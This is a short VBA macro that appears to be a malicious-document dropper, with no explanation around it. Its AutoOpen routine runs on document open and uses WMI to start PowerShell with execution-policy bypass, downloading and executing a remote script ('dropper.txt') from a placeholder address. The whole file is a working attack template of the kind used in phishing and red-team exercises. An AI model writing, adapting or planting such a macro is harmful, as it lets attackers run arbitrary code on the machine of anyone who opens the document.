Sub MyMacro()
  strArg = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nop -NoExit -c iex((new-object system.net.webclient).downloadstring('http://x.x.x.x/dropper.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub
